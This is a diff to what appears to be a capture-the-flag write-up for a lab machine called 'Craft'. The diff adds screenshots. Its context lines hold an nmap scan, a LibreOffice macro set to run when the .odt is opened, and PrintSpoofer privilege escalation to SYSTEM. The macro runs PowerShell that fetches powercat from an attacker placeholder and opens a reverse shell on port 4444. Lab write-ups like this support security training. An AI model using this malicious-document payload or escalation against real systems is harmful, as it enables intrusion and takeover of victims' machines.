@@ -28,6 +28,8 @@ second, stabler shell as the `apache` service account, which holds
 sudo nmap -sCV -p- -Pn <TARGET_IP>
 ```
 
+![nmap service scan](./assets/craft/01-nmap.png)
+
 The standout feature was a resume-upload form that only accepted `.odt`
 (OpenDocument Text) files.
 
@@ -52,6 +54,8 @@ Sub Main
     Shell("cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1'); powercat -c <ATTACKER_IP> -p 4444 -e powershell""")
 End Sub
 ```
+
+![the macro code in LibreOffice's editor](./assets/craft/02-macro-shell-code.png)
 
 That macro was then assigned to the document's own open event
 (**Tools → Customize → Events → Open Document**), so it runs the moment the
@@ -82,6 +86,8 @@ Uploading **PrintSpoofer** and running it spawned a SYSTEM process directly:
 ```
 PrintSpoofer.exe -i -c cmd
 ```
+
+![PrintSpoofer spawning a SYSTEM shell](./assets/craft/03-printspoofer.png)
 
 SYSTEM shell obtained, root flag retrieved.
 
